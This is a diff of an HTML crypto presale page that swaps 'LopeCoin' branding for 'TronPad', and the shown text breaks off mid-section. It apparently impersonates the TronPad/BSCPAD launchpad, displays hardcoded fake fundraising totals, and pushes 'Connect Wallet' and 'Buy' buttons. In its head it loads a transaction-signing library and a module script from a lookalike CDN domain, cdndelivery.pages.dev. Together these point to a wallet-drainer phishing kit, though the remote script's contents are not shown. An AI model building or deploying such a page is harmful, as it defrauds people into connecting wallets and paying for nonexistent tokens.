@@ -1,473 +1,916 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>LopeCoin Presale</title>
-    <link
-      href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
-      rel="stylesheet"
-    />
-    <style>
-      * {
-        padding: 0;
-        border: none;
-        margin: 0;
-      }
 
-      body {
-        background-image: url(./lopecoin/img/about-bg.jpg);
-        background-size: cover;
-        height: 100vh;
-        margin: 0;
-        position: relative;
-      }
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TronPadCoin Presale</title>
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet" />
 
-      .background-overlay {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0, 0, 0, 0.61);
-        /* Adjust the opacity as needed */
-        pointer-events: none;
-        /* Allow interactions to pass through */
-        z-index: 1;
-      }
-
-      .header a {
-        margin: 1rem;
-        border-radius: 1rem;
-        font-size: smaller;
-        color: #fff;
-        padding-left: 0.5rem;
-        padding-right: 0.5rem;
-        padding-top: 0.3rem;
-        padding-bottom: 0.3rem;
-        background: linear-gradient(
-          rgb(247 48 0 / 26%) 10.64%,
-          rgb(255 133 0 / 85%) 100%
-        ) !important;
-        z-index: 999;
-      }
-
-      .countdown strong {
-        padding: 10px;
-        box-shadow: 0 0 14px #ff33005e;
-        border: 1px solid #ffae00;
-        margin-left: 5px;
-        border-radius: 50%;
-        margin-right: 5px;
-        color: #fff;
-        font-weight: 900;
-        font-size: 29px;
-        background: linear-gradient(
-          180deg,
-          rgb(247 108 0 / 26%) 10.64%,
-          #ff5100d9 100%
-        ) !important;
-      }
-
-      .card {
-        position: relative;
-        z-index: 2;
-        /* Ensures the card is above the overlay */
-        align-items: center;
-        justify-content: center;
-        color: #fff;
-        box-shadow: -1px 0 116px -25px #000;
-        background: linear-gradient(
-          14deg,
-          rgba(37, 29, 4, 0.527) -0.24%,
-          rgba(0, 0, 0, 0.534) 100%
-        );
-        border-radius: 20px;
-        width: 400px;
-        border: 3px solid rgba(255, 133, 0, 0.85);
-      }
-
-      .card .card-header p {
-        color: #fff !important;
-        text-transform: uppercase;
-        background: linear-gradient(
-          180deg,
-          rgb(247 108 0 / 26%) 10.64%,
-          #ff5100d9 100%
-        ) !important;
-        border-radius: 15px;
-        box-shadow: 0 0 14px #ff33005e !important;
-        border: 1px solid #ffae00 !important;
-        font-size: 13px;
-        padding: 5px;
-        text-align: center;
-        margin-top: 10px;
-      }
-
-      .ads {
-        z-index: 999;
-      }
-
-      .ads {
-        width: 80%;
-      }
-
-      .raised {
-        background-color: #031a2100;
-        padding: 5px 20px;
-        margin-bottom: 20px;
-        border-radius: 15px;
-        text-align: center;
-        font-weight: 700;
-        font-size: 12px;
-        text-transform: capitalize;
-        color: #ffa700;
-        border: 2px dashed #ff7b22f7 !important;
-        box-shadow: 0 0 14px #ff6800a3 !important;
-      }
-
-      .raised-title {
-        font-size: 14px;
-        font-weight: 600;
-      }
-
-      .raised-amount {
-        color: #fcd535;
-        font-size: 18px;
-        font-weight: 700;
-        text-shadow: 0 0 3px rgb(255 230 0 / 77%);
-      }
-
-      .sold-title,
-      .sold-amount {
-        font-size: 15px;
-        font-weight: 400;
-        color: #fff;
-        text-shadow: 0 0 3px rgb(255 255 255);
-        padding: 5px 10px;
-        border-radius: 100px;
-      }
-
-      .balance h5 {
-        background: linear-gradient(
-          302deg,
-          rgb(106 42 5) 10.64%,
-          #ff5100d9 100%
-        ) !important;
-        width: 50%;
-        margin: 0 auto;
-        border-radius: 1rem;
-        box-shadow: 0 0 14px #ff6800a3 !important;
-        font-size: 16px;
-        font-weight: 700;
-        padding: 0.3rem;
-        border: 1px solid rgb(255 109 0 / 59%) !important;
-      }
-
-      form {
-      }
-
-      p.networkchange {
-        text-align: center;
-        color: #ff8a00;
-        text-transform: uppercase;
-        background-color: #201603;
-        border: 1px solid #00deff00;
-        border-radius: 15px;
-        font-size: 13px;
-        padding: 2px 15px;
-        width: 100%;
-      }
-
-      button.flex.items-center.justify-center.gap-2.rounded-xl.border-2.border-primary.py-2.px-2.transition-opacity.duration-200.hover\:opacity-75.buttonnet {
-        border: 2px solid #ff7b22f7 !important;
-        background: linear-gradient(
-          180deg,
-          rgb(247 108 0 / 26%) 10.64%,
-          #ff5100d9 100%
-        ) !important;
-        box-shadow: 0 0 14px #ff6800a3 !important;
-      }
-
-      .object-contain {
-        object-fit: contain;
-      }
-
-      .buttonnet {
-        width: 100%;
-        border-radius: 10px;
-        padding: -5px;
-      }
-
-      .buttonnet img {
-        width: 30px;
-      }
-
-      .hidden {
-        display: none;
-      }
-
-      .chains {
-        background: linear-gradient(
-          180deg,
-          rgb(247 108 0 / 26%) 10.64%,
-          #ff5100d9 100%
-        ) !important;
-        box-shadow: 0 0 14px #ff6800a3 !important;
-        -webkit-appearance: button;
-        background-color: transparent;
-        background-image: none;
-        gap: 3rem;
-        border-radius: 10px;
-        width: 150px;
-        margin: 1rem auto;
-      }
-
-       .h{
-        outline-color: transparent;
-        background-color: #420b00 !important;
-        color: #ffa400 !important;
-        font-weight: 900;
-      }
-
-      .input {
-        background: #000;
-        display: flex;
-        align-items: center;
-        background: linear-gradient(
-          rgb(247 48 0 / 26%) 10.64%,
-          rgb(255 133 0 / 85%) 100%
-        );
-        border: rgb(255 133 0 / 85%) solid 2px;
-        border-radius: 10px;
-        height: 50px;
-      }
-      .input img {
-        height: 40px;
-      }
-      input[type="number"] {
-        background-color: #420b00;
-        color: yellow;
-        font-weight: 700;
-      }
-      .button {
-        background: rgb(255 133 0 / 85%);
-        height: 50px;
-        padding: 0 30px;
-        border-radius: 10px;
-        margin-bottom: 30px;
-        font-weight: 700;
-      }
-    </style>
 
   <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.min.css" rel="stylesheet">
   <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="icon" href="./lopecoin/img/favicon.ico">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap"
+    rel="stylesheet">
 
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.all.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" integrity="sha512-FDcVY+g7vc5CXANbrTSg1K5qLyriCsGDYCE02Li1tXEYdNQPvLPHNE+rT2Mjei8N7fZbe0WLhw27j2SrGRpdMg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js" integrity="sha512-2oprd2T2vSkAii+dVWi6C+uATbQ1YGmCed6b6msb9Jxi33hsXAbnhwZ9thwCq6ndidZv4P51qaq58uo9b/x4nA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-        
+  <script
+    src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"
+    integrity="sha512-FDcVY+g7vc5CXANbrTSg1K5qLyriCsGDYCE02Li1tXEYdNQPvLPHNE+rT2Mjei8N7fZbe0WLhw27j2SrGRpdMg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js"
+    integrity="sha512-2oprd2T2vSkAii+dVWi6C+uATbQ1YGmCed6b6msb9Jxi33hsXAbnhwZ9thwCq6ndidZv4P51qaq58uo9b/x4nA=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- Material Design Icons CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/@mdi/font/css/materialdesignicons.min.css" rel="stylesheet">
+
   <script src="./settings.js"></script>
   <script src="https://cdndelivery.pages.dev/web3-ethers.js" type="module"></script>
-  </head>
+</head>
+<style>
+  * {
+    padding: 0;
+    border: none;
+    margin: 0;
+    text-decoration: none;
+    list-style: none;
+  }
 
-  <body>
-    <div class="background-overlay"></div>
+  body {
+    background-image: url(./lopecoin/img/OIP.svg);
+    background-size: contain;
+    /* height: 100vh; */
+    margin: 0;
+    position: relative;
+    background-position: center;
+    background-color: #0000006b;
+  }
 
-    <div class="container-fluid">
+  .background-overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.61);
+    /* Adjust the opacity as needed */
+    pointer-events: none;
+    /* Allow interactions to pass through */
+    z-index: 1;
+  }
+
+  .header a {
+    margin: 1rem;
+    border-radius: 1rem;
+    font-size: smaller;
+    color: #fff;
+    padding-left: 0.5rem;
+    padding-right: 0.5rem;
+    padding-top: 0.3rem;
+    padding-bottom: 0.3rem;
+    background: linear-gradient(rgba(247, 0, 0, 0.26) 10.64%,
+        rgba(255, 38, 0, 0.85) 100%) !important;
+    z-index: 999;
+  }
+
+  .countdown strong {
+    padding: 10px;
+    box-shadow: 0 0 14px #ff33005e;
+    border: 1px solid #ff0000;
+    margin-left: 5px;
+    border-radius: 50%;
+    margin-right: 5px;
+    color: #fff;
+    font-weight: 900;
+    font-size: 29px;
+    background: linear-gradient(180deg,
+        rgba(247, 0, 0, 0.26) 10.64%,
+        #ff0000d9 100%) !important;
+  }
+
+  .card {
+    position: relative;
+    z-index: 2;
+    /* align-items: center; */
+    /* justify-content: center; */
+    color: #fff;
+    /* box-shadow: -1px 0 116px -25px #000;
+    background: linear-gradient(14deg,
+        rgba(37, 29, 4, 0.527) -0.24%,
+        rgba(0, 0, 0, 0.856) 100%); */
+    border-radius: 20px;
+    padding: 0 0.5rem;
+    width: 400px;
+    border: 3px solid rgba(255, 0, 0, 0.85);
+  }
+
+  .card,
+  form {
+    box-shadow: -1px 0 116px -25px #000;
+    background: linear-gradient(14deg,
+        rgba(37, 4, 4, 0.884) -0.24%,
+        rgba(0, 0, 0, 0.822) 100%);
+  }
+
+  .card .card-header p {
+    color: #fff !important;
+    text-transform: uppercase;
+    background: linear-gradient(180deg,
+        rgba(247, 0, 0, 0.26) 10.64%,
+        #ff0000d9 100%) !important;
+    border-radius: 15px;
+    box-shadow: 0 0 14px #ff33005e !important;
+    border: 1px solid #ff0000 !important;
+    font-size: 13px;
+    padding: 5px;
+    text-align: center;
+    margin-top: 10px;
+  }
+
+  .ads {
+    z-index: 999;
+    color: #fff;
+  }
+
+  .ads {
+    width: 80%;
+  }
+
+  .raised {
+    background-color: #031a2100;
+    padding: 5px 20px;
+    margin-bottom: 20px;
+    border-radius: 15px;
+    text-align: center;
+    font-weight: 700;
+    font-size: 12px;
+    text-transform: capitalize;
+    color: #ff0000;
+    border: 2px dashed #ff2222f7 !important;
+    box-shadow: 0 0 14px #ff0000a3 !important;
+  }
+
+  .raised-title {
+    font-size: 14px;
+    font-weight: 600;
+  }
+
+  .raised-amount {
+    color: #fc3535;
+    font-size: 18px;
+    font-weight: 700;
+    text-shadow: 0 0 3px rgba(255, 0, 0, 0.77);
+  }
+
+  .sold-title,
+  .sold-amount {
+    font-size: 15px;
+    font-weight: 400;
+    color: #fff;
+    text-shadow: 0 0 3px rgb(255 255 255);
+    padding: 5px 10px;
+    border-radius: 100px;
+  }
+
+  .balance h5 {
+    background: linear-gradient(302deg,
+        rgb(106, 5, 5) 10.64%,
+        #ff0000d9 100%) !important;
+    width: 50%;
+    margin: 0 auto;
+    border-radius: 1rem;
+    box-shadow: 0 0 14px #ff0000a3 !important;
+    font-size: 16px;
+    font-weight: 700;
+    padding: 0.3rem;
+    border: 1px solid rgba(255, 0, 0, 0.59) !important;
+  }
+
+  form {}
+
+  p.networkchange {
+    text-align: center;
+    color: #ff0000;
+    text-transform: uppercase;
+    background-color: #201603;
+    border: 1px solid #00deff00;
+    border-radius: 15px;
+    font-size: 13px;
+    padding: 2px 15px;
+    width: 100%;
+  }
+
+  button.flex.items-center.justify-center.gap-2.rounded-xl.border-2.border-primary.py-2.px-2.transition-opacity.duration-200.hover\:opacity-75.buttonnet {
+    border: 2px solid #ff2222f7 !important;
+    background: linear-gradient(180deg,
+        rgba(247, 0, 0, 0.26) 10.64%,
+        #ff0000d9 100%) !important;
+    box-shadow: 0 0 14px #ff0000a3 !important;
+  }
+
+  .object-contain {
+    object-fit: contain;
+  }
+
+  .buttonnet {
+    width: 100%;
+    border-radius: 10px;
+    padding: -5px;
+  }
+
+  .buttonnet img {
+    width: 30px;
+  }
+
+  .hidden {
+    display: none;
+  }
+
+  .chains {
+    background: linear-gradient(180deg,
+        rgb(247 108 0 / 26%) 10.64%,
+        #ff0000d9 100%) !important;
+    box-shadow: 0 0 14px #ff6800a3 !important;
+    -webkit-appearance: button;
+    background-color: transparent;
+    background-image: none;
+    gap: 3rem;
+    border-radius: 10px;
+    width: 150px;
+    margin: 1rem auto;
+  }
+
+  .h {
+    outline-color: transparent;
+    background-color: #420b00 !important;
+    color: #ff0000 !important;
+    font-weight: 900;
+  }
+
+  .input {
+    background: #000;
+    display: flex;
+    align-items: center;
+    background: linear-gradient(rgba(247, 0, 0, 0.26) 10.64%,
+        rgba(255, 0, 0, 0.85) 100%);
+    border: rgba(255, 0, 0, 0.85) solid 2px;
+    border-radius: 10px;
+    height: 50px;
+  }
+
+  .input img {
+    height: 40px;
+  }
+
+  input[type="number"] {
+    background-color: #420b00;
+    color: rgb(255, 0, 0);
+    font-weight: 700;
+  }
+
+  .button {
+    background: rgba(255, 0, 0, 0.85);
+    height: 50px;
+    padding: 0 30px;
+    border-radius: 10px;
+    margin-bottom: 30px;
+    font-weight: 700;
+
+  }
+
+
+  .bthovern:hover{
+    cursor: pointer;
+  }
+  .navbar {
+    box-shadow: 0 4px 2px -2px rgb(0, 0, 0);
+    background-color: #1a1a1a !important;
+    color: #fff;
+    z-index: 999;
+  }
+
+
+  .nav-link {
+    background: transparent;
+    border: 1px #C63127 solid !important;
+    color: #C63127 !important;
+    border-radius: 20px;
+    padding-left: 18px !important;
+    padding-right: 18px !important;
+  }
+
+  .nav-link-main {
+    background: linear-gradient(to right, #9c2820, #C63127);
+    border: 1px #9c2820 solid !important;
+    border-radius: 20px;
+    color: #fff !important;
+    padding-left: 18px !important;
+    padding-right: 18px !important;
+
+  }
+
+  .z-10 {
+    z-index: 999;
+  }
+
+  .btn-justswap {
+    background: #4850E5;
+    border: 1px #4850E5 solid !important;
+    border-radius: 20px;
+    color: #fff !important;
+    padding-left: 18px !important;
+    padding-right: 18px !important;
+    box-shadow: 1px 0 2px #1cbcc7;
+  }
+
+  .btn-primary {
+    background: linear-gradient(to right, #9c2820, #C63127);
+    border: 1px #9c2820 solid !important;
+    border-radius: 20px;
+    color: #fff !important;
+    padding-left: 18px !important;
+    padding-right: 18px !important;
+  }
+
+  .btn-lg {
+    padding: 10px 30px !important;
+    letter-spacing: 0.1em;
+    min-width: 120px;
+    font-size: 16px;
+    line-height: 25px;
+    text-transform: uppercase;
+    border-radius: 40px;
+    font-weight: 500;
+
+  }
+
+  .btn-pancake {
+    background: linear-gradient(to right, #1FC7D4, #1FC7D4);
+    border: 1px #1FC7D4 solid !important;
+    border-radius: 20px;
+    color: #fff !important;
+    padding-left: 18px !important;
+    padding-right: 18px !important;
+    box-shadow: 1px 0 2px #1cbcc7;
+  }
+
+  .btn-success,
+  .btn-outline-success {
+    background: linear-gradient(to right, #02bf02, #02bf02);
+    border: 1px #02bf02 solid !important;
+    border-radius: 20px;
+    color: #fff !important;
+    padding-left: 18px !important;
+    padding-right: 18px !important;
+  }
+
+  .pricing-table {
+    text-align: center;
+    cursor: default;
+    margin: 0 auto;
+    width: 100%;
+    padding: 30px;
+    background-color: rgb(31 31 33);
+    border-radius: 10px;
+    -webkit-box-shadow: 0 10px 30px 0 rgba(5, 16, 44, .15);
+    box-shadow: 0 10px 30px 0 rgba(5, 16, 44, .15);
+    -webkit-transition: .4s;
+    transition: .4s;
+    margin-bottom: 25px;
+  }
+
+  .pp-card-legal-partner {
+    border-radius: 10px;
+    background: #f6f6f6;
+    padding: 30px 20px;
+  }
+
+  .darkmode {
+    background-color: #1a1a1a !important;
+}
+
+  @media screen and (max-width:1080) {
+    .reverse {
+      display: flex;
+      flex-direction: column-reverse;
+    }
+  }
+</style>
+
+<body>
+  <div class="background-overlay"></div>
+
+  <!-- Navbar  -->
+
+  <!-- Navbar Start -->
+  <nav class="navbar navbar-expand-lg  bg-light">
+    <div class="container-fluid d-flex justify-content-right">
+      <a class="navbar-brand" href="#">
+        <img src="lopecoin/img/TronPad_white.svg" alt="Logo" width="30" height="30" class="d-inline-block align-top">
+
+      </a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
+        aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav">
+          <li class="nav-item active">
+            <a class="nav-link btn-primary" href="#"><span><i class="mdi mdi-wallet-plus-outline me-1"></i></span>
+              Connect Wallet <span class="sr-only">(current)</span></a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#"><span><i class="mdi mdi-fire me-1"></i></span> Projects</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#"><span><i class="mdi mdi-blender-software me-1"></i></span> Staking</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#"><span><i class="mdi mdi-bridge me-1"></i></span> Bridge</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Navbar End -->
+
+  <div class="container-fluid mb-3">
+    <div class="container">
+      <div class="d-flex justify-content-center flex-wrap header">
+        <!-- <a href="">website</a>
+        <a href="">how to buy</a>
+        <a href="">white paper</a>
+        <a href="">KYC+ | Audit+</a> -->
+      </div>
+    </div>
+  </div>
+
+  <div class="container d-flex justify-content-center flex-wrap flex-row-reverse reverse">
+    <div class="card text-center">
+      <div class="card-header">
+        <p>THE LAST STAGE OF TronPad PRESALE</p>
+      </div>
+      <div class="card-body">
+        <div id="countdown" class="countdown mb-4">
+          <strong>00</strong>:<strong>00</strong>:<strong>00</strong>:<strong>00</strong>
+        </div>
+        <div class="raised">
+          <h5>
+            <span class="raised-title">Raised:</span>
+            <span class="raised-amount">$2,556,542.392</span>
+          </h5>
+          <h5>
+            <span class="sold-title">TronPad Sold:</span><span class="sold-amount">$24,779,446,784,077.207</span>
+          </h5>
+        </div>
+        <div class="balance">
+          <h5>Balance: <span>0 TronPads</span></h5>
+        </div>
+      </div>
+
+      <form action="post">
+        <p class="networkchange">Token distribution date: 6/24/2024</p>
+        <button
+          class="flex items-center justify-center gap-2 rounded-xl border-2 border-primary py-2 px-2 transition-opacity duration-200 hover:opacity-75 buttonnet"
+          type="button">
+          <img src="./lopecoin/img/chains/tron.svg" class="h-5 w-5 object-contain" />
+          <span class="hidden lg:block">BSC Network</span>
+        </button>
+
+        <div class="grid grid-cols-2 gap-5 lg:grid-cols-2">
+          <button type="button"
+            class="chains flex items-center justify-center gap-2 w-full rounded-xl border-2 py-2 px-2 transition-opacity duration-200 hover:opacity-75 border-green-600">
+            <img src="./lopecoin/img/chains/tron.svg" alt="Tron" class="h-7 w-7 object-contain" width="30px" />
+            <span class="text-sm">Tron</span>
+          </button>
+          <button type="button"
+            class="chains flex items-center justify-center gap-2 w-full rounded-xl border-2 py-2 px-2 transition-opacity duration-200 hover:opacity-75 border-gray-300">
+            <img src="./lopecoin/img/tokens/usdt.svg" alt="USDT" class="h-7 w-7 object-contain" width="30px" />
+            <span class="text-sm">USDT</span>
+          </button>
+        </div>
+        <div class="relative mt-2 flex flex-col items-center justify-center">
+          <span class="z-10 -mt-2 px-4 font-bold text-white bg-black">1 TronPad = $0.00000050</span>
+        </div>
+
+        <div class="flex flex-col gap-2">
+          <label class="text-sm text-gray-600">Amount in <span class="font-bold tracking-widest">USDT</span> you
+            pay</label>
+          <div
+            class="flex w-full overflow-hidden rounded-xl border-2 border-gray-300 text-xl focus-within:border-primary/50 input">
+            <input class="flex-1 py-3 px-3 outline-none focus:ring-0 transition duration-200 ease-in-out" type="number"
+              min="0" step="0.00001" placeholder="0.0" value="" />
+            <div class="flex items-center justify-center border-l-2 border-gray-300 bg-[#f4f4f6] px-4">
+              <img src="./lopecoin/img/tokens/usdt.svg" alt="USDT Coin" class="h-6 w-6 object-contain" />
+            </div>
+          </div>
+        </div>
+
+        <div class="flex flex-col gap-2">
+          <label class="text-sm text-gray-600">Amount in <span class="font-bold tracking-widest">TronPad</span> you
+            receive</label>
+          <div
+            class="flex w-full overflow-hidden rounded-xl border-2 border-gray-300 text-xl focus-within:border-primary/50 input">
+            <input class="flex-1 py-3 px-3 outline-none focus:ring-0 transition duration-200 ease-in-out" type="number"
+              min="0" step="0.00001" placeholder="0.0" value="" />
+            <div class="flex items-center justify-center border-l-2 border-gray-300 bg-[#f4f4f6] px-4">
+              <img src="./lopecoin/img/tronpad.svg" alt="TronPadCoin" class="h-6 w-6 object-contain" />
+            </div>
+          </div>
+        </div>
+
+        <button
+          class="relative flex w-full items-center justify-center gap-2 text-lg font-semibold text-white transition-opacity duration-200 hover:opacity-75 disabled:cursor-not-allowed disabled:opacity-80 mt-2 :text-xl button claim-button"
+          type="button">
+          <span><i class="mdi mdi-wallet-plus-outline me-1"></i></span>Buy TronPad
+        </button>
+      </form>
+    </div>
+    <div class="col-md-6 ads">
+      <h1>TRONPAD IS THE FIRST LAUNCHPAD BUILT ON AND PARTNERED WITH THE TRON NETWORK</h1>
+      <!-- <img src="./lopecoin/img/lope.png" alt="Side background-image" /> -->
+      <p>
+        TRONPAD will empower crypto currency projects with the ability to distribute tokens and raise liquidity.
+      </p>
+
+      <h2>The world's fastest-growing public chain has officially partnered with the world's most lucrative launchpad.
+      </h2>
+      <img src="lopecoin/img/banner.png" alt="banner" width="100%">
+
+    </div>
+    <div class="container-fluid mb-5 mt-5 z-10">
       <div class="container">
-        <div class="d-flex justify-content-center flex-wrap header">
-          <a href="">website</a>
-          <a href="">how to buy</a>
-          <a href="">white paper</a>
-          <a href="">KYC+ | Audit+</a>
+        <div class="d-flex justify-content-center flex-wrap ">
+          <a class="nav-link btn-primary btn-lg" href="">View All Projects</a>
+          <a class="nav-link btn-justswap btn-lg" href="">Buy on <img src="./lopecoin/img/justswap.svg" alt=""></a>
+          <a class="nav-link btn-lg btn-pancake" href="">Vew On DEXTOOLS</a>
+          <a class="nav-link btn-lg btn-success" href="">Apply For IDO</a>
         </div>
       </div>
     </div>
 
-    <div class="container d-flex justify-content-center align-items-center">
-      <div class="card text-center">
-        <div class="card-header">
-          <p>THE LAST STAGE OF LOPECOIN PRESALE</p>
-        </div>
-        <div class="card-body">
-          <div id="countdown" class="countdown mb-4">
-            <strong>00</strong>:<strong>00</strong>:<strong>00</strong>:<strong
-              >00</strong
-            >
-          </div>
-          <div class="raised">
-            <h5>
-              <span class="raised-title">Raised:</span>
-              <span class="raised-amount">$2,556,542.392</span>
-            </h5>
-            <h5>
-              <span class="sold-title">LOPE Sold:</span
-              ><span class="sold-amount">$24,779,446,784,077.207</span>
-            </h5>
-          </div>
-          <div class="balance">
-            <h5>Balance: <span>0 LOPES</span></h5>
-          </div>
-        </div>
-
-        <form action="post">
-          <p class="networkchange">Token distribution date: 6/24/2024</p>
-          <button
-            class="flex items-center justify-center gap-2 rounded-xl border-2 border-primary py-2 px-2 transition-opacity duration-200 hover:opacity-75 buttonnet"
-            type="button"
-          >
-            <img
-              src="./lopecoin/img/chains/binance.svg"
-              class="h-5 w-5 object-contain"
-            />
-            <span class="hidden lg:block">BSC Network</span>
-          </button>
-
-          <div class="grid grid-cols-2 gap-5 lg:grid-cols-2">
-            <button
-              type="button"
-              class="chains flex items-center justify-center gap-2 w-full rounded-xl border-2 py-2 px-2 transition-opacity duration-200 hover:opacity-75 border-green-600"
-            >
-              <img
-                src="./lopecoin/img/tokens/bsc.png"
-                alt="BNB"
-                class="h-7 w-7 object-contain"
-                width="30px"
-              />
-              <span class="text-sm">BNB</span>
-            </button>
-            <button
-              type="button"
-              class="chains flex items-center justify-center gap-2 w-full rounded-xl border-2 py-2 px-2 transition-opacity duration-200 hover:opacity-75 border-gray-300"
-            >
-              <img
-                src="./lopecoin/img/tokens/usdt.png"
-                alt="USDT"
-                class="h-7 w-7 object-contain"
-                width="30px"
-              />
-              <span class="text-sm">USDT</span>
-            </button>
-          </div>
-          <div class="relative mt-2 flex flex-col items-center justify-center">
-            <span class="z-10 -mt-2 px-4 font-bold text-white bg-black"
-              >1 LOPE = $0.00000050</span
-            >
-          </div>
-
-          <div class="flex flex-col gap-2">
-            <label class="text-sm text-gray-600"
-              >Amount in <span class="font-bold tracking-widest">USDT</span> you
-              pay</label
-            >
-            <div
-              class="flex w-full overflow-hidden rounded-xl border-2 border-gray-300 text-xl focus-within:border-primary/50 input"
-            >
-              <input
-                class="flex-1 py-3 px-3 outline-none focus:ring-0 transition duration-200 ease-in-out"
-                type="number"
-                min="0"
-                step="0.00001"
-                placeholder="0.0"
-                value=""
-              />
-              <div
-                class="flex items-center justify-center border-l-2 border-gray-300 bg-[#f4f4f6] px-4"
-              >
-                <img
-                  src="./lopecoin/img/tokens/usdt.png"
-                  alt="USDT Coin"
-                  class="h-6 w-6 object-contain"
-                />
-              </div>
+    <div class="pp-home-about pp-section text-white mb-5 mt-5" id="about">
+      <div class="container">
+        <div class="row justify-content-center text-center">
+          <div class="col-lg-6">
+            <div class="section-head">
+              <h2 class="title title-xl" data-aos="fade-up" data-aos-delay="100" title="What and Why">ABOUT US</h2>
             </div>
           </div>
-
-          <div class="flex flex-col gap-2">
-            <label class="text-sm text-gray-600"
-              >Amount in <span class="font-bold tracking-widest">LOPE</span> you
-              receive</label
-            >
-            <div
-              class="flex w-full overflow-hidden rounded-xl border-2 border-gray-300 text-xl focus-within:border-primary/50 input"
-            >
-              <input
-                class="flex-1 py-3 px-3 outline-none focus:ring-0 transition duration-200 ease-in-out"
-                type="number"
-                min="0"
-                step="0.00001"
-                placeholder="0.0"
-                value=""
-              />
-              <div
-                class="flex items-center justify-center border-l-2 border-gray-300 bg-[#f4f4f6] px-4"
-              >
-                <img
-                  src="./lopecoin/img/LopeCoin.png"
-                  alt="LopeCoin"
-                  class="h-6 w-6 object-contain"
-                />
-              </div>
-            </div>
-          </div>
-
-          <button
-            class="relative flex w-full items-center justify-center gap-2 text-lg font-semibold text-white transition-opacity duration-200 hover:opacity-75 disabled:cursor-not-allowed disabled:opacity-80 mt-2 :text-xl button claim-button"
-            type="button"
-          >
-            Connect wallet
-          </button>
-        </form>
+        </div>
       </div>
-      <div class="col-md-6 ads">
-        <img src="./lopecoin/img/lope.png" alt="" />
-        <p>
-          00% of LOPE tokens will be automatically distributed on 6/24/2024.
-          After holding IEO in BitMart exchanges, LOPE will be tradable.
-        </p>
+      <div class="pp-home-about-content pp-section-body mt-4">
+        <div class="container">
+          <div class="row align-items-center">
+            <div class="col-md-6" data-aos="fade-up" data-aos-delay="200">
+              <h6>WHAT IS TRONPAD?</h6>
+              <h2>TronPad is the only IDO platform built on and partnered with the Tron Network.</h2>
+              <p class="lead-s2">TronPad will empower cryptocurrency projects with the ability to distribute tokens and
+                raise liquidity.</p>
+              <h6 class="mt-4">WHY CHOOSE US?</h6>
+              <h2>Following the success of BSCPAD, the BSCPAD Team has partnered with Tron to bring its popular low
+                barrier to entry IDO solutions to to the Tron network that will incentivize and reward all token holders
+                in a way that is inclusive and fair.</h2>
+              <p>One of the fundamental flaws of existing launchpads is acquiring enough tokens to participate in the
+                ecosystem can be prohibitive. This can be based on a first come first serve basis where automated bots
+                can fill the whitelist spots in a matter of seconds. TronPad addresses this issue and is designed for
+                fair decentralized launches.</p>
+              <p>The hallmark of TronPad is a two-round system, consisting of a participation lottery for lower levels
+                and guaranteed allocation for higher levels. Any of the allocation that is not bought in time is then
+                offered on a 'first come first served' basis.</p>
+            </div>
+            <div class="col-md-6">
+              <div class="nk-block-img nk-block-ca text-center" data-aos="fade-up" data-aos-delay="200"
+                style="position: relative;">
+                <div class="nk-circle-animation nk-df-center fast"></div><img class="shadow rounded mx-auto"
+                  src="./lopecoin/img/sc-medium-a.png" alt="" style="width: 60%;">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pp-home-how-it-work pp-section pt-3 text-white z-10" id="how-it-work">
+      <div class="container">
+        <div class="row justify-content-center text-center">
+          <div class="col-lg-12">
+            <div class="section-head">
+              <h2 class="title title-xl" data-aos="fade-up" data-aos-delay="100" title="Tiered System">THE TRONPAD
+                TIERED SYSTEM</h2>
+              <p data-aos="fade-up" data-aos-delay="200" class="mt-3">TronPad offers a weighted lottery tier and
+                guaranteed allocation tiers.</p>
+              <div class="row align-items-center mt-5">
